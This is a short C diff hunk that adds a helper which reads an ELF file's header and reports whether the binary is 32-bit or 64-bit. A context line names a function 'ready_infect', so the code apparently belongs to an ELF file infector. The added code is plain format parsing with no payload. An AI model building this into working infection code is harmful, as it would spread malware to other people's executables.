@@ -29,3 +29,21 @@ int ready_infect(char *path)
     return 0;
 }
 
+
+ElfClass detect_class(int fd)
+{
+    unsigned char ident[EI_NIDENT];
+    ElfClass cls = {0};
+
+    lseek(fd, 0, SEEK_SET);
+    if (read(fd, ident, EI_NIDENT) != EI_NIDENT)
+        return cls;
+
+    if (ident[EI_CLASS] == ELFCLASS32)
+        cls.is32 = 1;
+    else if (ident[EI_CLASS] == ELFCLASS64)
+        cls.is64 = 1;
+
+    return cls;
+}
+
